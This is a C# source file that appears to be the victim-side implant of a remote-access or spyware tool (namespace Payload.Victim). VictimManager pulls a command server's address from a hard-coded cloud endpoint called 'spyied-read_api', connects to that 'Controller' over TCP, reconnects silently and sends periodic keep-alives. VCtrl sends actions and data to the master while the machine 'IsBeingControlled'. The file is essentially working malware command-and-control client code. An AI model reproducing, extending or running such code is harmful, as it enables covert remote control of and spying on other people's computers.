using System;
using EasyTcp4;
using System.Text;
using Payload.Codes;
using Newtonsoft.Json;
using EasyTcp4.Actions;
using System.Threading;
using EasyTcp4.PacketUtils;
using EasyTcp4.ClientUtils;
using EasyTcp4.Actions.Utils;

namespace Payload.Victim
{
    public static class VictimManager
    {
        #region Declaration

        private static bool IsFirstTime = true;
        private static bool HasPrevented = true;

        public static bool IsMasterConnected { get; set; } = false;
        public static EasyTcpActionClient AClient { get; private set; } = null;

        #endregion

        #region Client Handling

        private static void HandleDisconnection()
        {
            try
            {
                AClient.OnUnknownAction -= AClient_OnUnknownAction;
                AClient.OnDisconnect -= AClient_OnDisconnect;
                AClient.OnError -= AClient_OnError;
            }
            catch { }
            finally
            {
                IsMasterConnected = false;
                AClient = null;
            }
        }

        public static async void LoopForConnection()
        {
            int TConTrial = 1;
            HasPrevented = true;

            if (IsFirstTime)
            {
                IsFirstTime = false;
                VUtils.OnInternetChanged += OnInternetChanged;
                new Thread(delegate () { LoopRemainConnected(); }).Start();
            }

            while (!IsMasterConnected)
            {
                if (await VUtils.IsNetConnected())
                {
                    string EPIData, EPURL = "https://acc32d92.eu-gb.apigw.appdomain.cloud/spyied-read_api/read?Type=Endpoint";
                    Console.WriteLine("[LATEST-VERSION] | Stable Internet Found :)");
                    Console.WriteLine("Retrieving The Connection Endpoint....");

                    if (!string.IsNullOrWhiteSpace(EPIData = await EPURL.GetAsync()))
                    {
                        Console.WriteLine("Parsing Received Data.....");
                        var EPInf = JsonConvert.DeserializeObject<EndpointInfo>(EPIData);

                        if (EPInf != null)
                        {
                            for (int I = 1; I <= 5; I++)
                            {
                                if (!await VUtils.IsNetConnected())
                                {
                                    Console.Clear();
                                    Console.WriteLine("No Connection Available!");
                                    break;
                                }

                                try
                                {
                                    if (AClient == null)
                                    {
                                        Console.WriteLine("Connecting To The Server.......");

                                        AClient = new EasyTcpActionClient
                                        {
                                            Serialize = SObj => Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(SObj)),
                                            Deserialize = (BTS, TP) => JsonConvert.DeserializeObject(Encoding.UTF8.GetString(BTS), TP)
                                        };

                                        AClient.Interceptor = ActMSG =>
                                        {
                                            ActMSG = ActMSG.Decompress();
                                            return true;
                                        };

                                        if (AClient.Connect(EPInf.IPAddress, ushort.Parse(EPInf.Port)))
                                        {
                                            Console.Clear();
                                            VUtils.SWTracer.Stop();
                                            Console.WriteLine("Connected With Controller In : " + VUtils.SWTracer.ElapsedMilliseconds + " MS");
                                            AClient.OnUnknownAction += AClient_OnUnknownAction;
                                            AClient.OnDisconnect += AClient_OnDisconnect;
                                            AClient.OnError += AClient_OnError;
                                            IsMasterConnected = true;
                                            break;
                                        }
                                        else AClient = null;
                                    }
                                }
                                catch { }

                                Console.Clear();
                                Console.WriteLine(TConTrial++ + " Attempts Made For Connection");
                            }
                        }
                    }
                }
                else
                {
                    Console.Clear();
                    Console.WriteLine("No Connection Available!");
                    break;
                }
            }

            while (true) { if (!IsMasterConnected && !HasPrevented) { LoopForConnection(); break; } Thread.Sleep(1000); }
        }

        private static async void LoopRemainConnected()
        {
            while (true)
            {
                try
                {
                    Thread.Sleep(10 * 1000);
                    if (await VUtils.IsNetConnected() &&
                        AClient != null && IsMasterConnected) AClient.SendAction("AB");
                }
                catch { HandleDisconnection(); HasPrevented = false; }
            }
        }

        #endregion

        #region Client Events Handling

        private static void OnInternetChanged(bool IsConnected)
        {
            if (IsConnected && !IsMasterConnected) HasPrevented = false;
            else
            {
                Console.Clear();
                HandleDisconnection();
                Console.WriteLine("-- [Network-Disconnected] --");
            }
        }

        private static void AClient_OnError(object sender, Exception e)
        {
            Console.WriteLine($"Exception => \n{e.Message}\n{e.StackTrace}\n");
        }

        private static void AClient_OnUnknownAction(object sender, Message e)
        {
        }

        private static void AClient_OnDisconnect(object sender, EasyTcpClient e)
        {
            Console.Clear();
            HandleDisconnection();
            Console.WriteLine("-- [Disconnected] --");
            VUtils.SWTracer.Restart();
            Thread.Sleep(500);
            HasPrevented = false;
        }

        #endregion
    }

    public static class VCtrl
    {
        public static bool IsBeingControlled { get; set; } = false;

        public static bool RequestAction(string Act)
        {
            try
            {
                if (VictimManager.IsMasterConnected && IsBeingControlled)
                {
                    if (VictimManager.AClient != null)
                        VictimManager.AClient.SendAction(Act);
                    return true;
                }
            }
            catch { }
            return false;
        }

        public static bool RequestAction<T>(string Act, T PToSend, bool IsCompress = true)
        {
            try
            {
                if (VictimManager.IsMasterConnected && IsBeingControlled)
                {
                    if (VictimManager.AClient != null)
                    {
                        if (PToSend is Message Msg) VictimManager.AClient.SendAction(Act, Msg, IsCompress); //Preventing Circular Loop
                        else VictimManager.AClient.SendAction(Act, PToSend, IsCompress);
                        return true;
                    }
                }
            }
            catch { }
            return false;
        }
    }
}
